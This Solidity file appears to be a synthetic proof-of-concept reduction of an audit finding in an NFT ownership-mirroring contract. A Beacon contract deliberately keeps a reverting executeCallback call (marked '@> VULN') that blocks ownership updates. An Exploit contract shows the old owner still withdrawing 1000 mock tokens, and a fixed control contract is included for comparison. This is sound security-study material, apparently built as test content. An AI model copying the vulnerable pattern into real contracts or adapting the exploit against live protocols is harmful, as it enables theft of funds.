// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  NFTMirror — executeCallback reverts the native-chain ownership update
    (Pashov H-01, finding 50037).
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    triggerOwnershipUpdate writes the new owner and then calls
    executeCallback on the NFT. On the native chain that call reverts, so
    the owner write rolls back. The old owner still pulls 1000. The control
    skips the callback, the new owner is stored, and the old owner cannot
    pull. The blamed call is preserved verbatim (@> VULN). run() does not warp. */

contract MockToken {
    string public symbol = "USDC";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract NFT {
    MockToken public token;
    address public owner;

    constructor(address token_, address owner_) {
        token = MockToken(token_);
        owner = owner_;
    }

    function setOwner(address next) external {
        owner = next;
    }

    function executeCallback(bytes32) external pure {
        revert("no callback on native nft");
    }

    function pull(address to, uint256 amount) external {
        require(msg.sender == owner, "owner");
        require(token.transfer(to, amount), "pull");
    }
}

contract Beacon {
    function triggerOwnershipUpdate(address shadowAddress, address newOwner, bytes32 guid) external {
        NFT(shadowAddress).setOwner(newOwner);
        INFTShadow _shadow = INFTShadow(shadowAddress);
        // @> VULN: on the native chain shadowAddress is the NFT, so executeCallback reverts and the owner write rolls back
        _shadow.executeCallback(guid);
    }
}

interface INFTShadow {
    function executeCallback(bytes32 guid) external;
}

contract BeaconFixed {
    function triggerOwnershipUpdate(address shadowAddress, address newOwner) external {
        NFT(shadowAddress).setOwner(newOwner);
    }
}

contract NewOwner {
    function take(address nft, address to, uint256 amount) external {
        NFT(nft).pull(to, amount);
    }
}

contract Exploit {
    uint256 public constant AMOUNT = 1000 ether;
    bytes32 public constant GUID = bytes32(uint256(1));

    MockToken public token; // CREATE nonce 1
    NFT public nft; // CREATE nonce 2
    Beacon public beacon; // CREATE nonce 3
    NFT public controlNft; // CREATE nonce 4
    BeaconFixed public controlBeacon; // CREATE nonce 5
    NewOwner public newOwner; // CREATE nonce 6

    address public ownerAfter;
    uint256 public oldOwnerPulled;
    bool public updateBlocked;
    bool public oldOwnerBlockedOnControl;
    uint256 public newOwnerGot;

    constructor() {
        token = new MockToken();
        nft = new NFT(address(token), address(this));
        beacon = new Beacon();
        controlNft = new NFT(address(token), address(this));
        controlBeacon = new BeaconFixed();
        newOwner = new NewOwner();
    }

    function run() external {
        token.mint(address(nft), AMOUNT);
        token.mint(address(controlNft), AMOUNT);

        try beacon.triggerOwnershipUpdate(address(nft), address(newOwner), GUID) {
            updateBlocked = false;
        } catch {
            updateBlocked = true;
        }
        ownerAfter = nft.owner();
        require(updateBlocked, "native update did not revert");
        require(ownerAfter == address(this), "old owner was replaced");

        nft.pull(address(this), AMOUNT);
        oldOwnerPulled = token.balanceOf(address(this));
        require(oldOwnerPulled == AMOUNT, "old owner did not move 1000");

        controlBeacon.triggerOwnershipUpdate(address(controlNft), address(newOwner));
        try controlNft.pull(address(this), AMOUNT) {
            oldOwnerBlockedOnControl = false;
        } catch {
            oldOwnerBlockedOnControl = true;
        }
        require(oldOwnerBlockedOnControl, "old owner pulled after the control transfer");
        require(controlNft.owner() == address(newOwner), "control owner was not updated");

        newOwner.take(address(controlNft), address(newOwner), AMOUNT);
        newOwnerGot = token.balanceOf(address(newOwner));
        require(newOwnerGot == AMOUNT, "control transfer did not pay the new owner");
    }
}
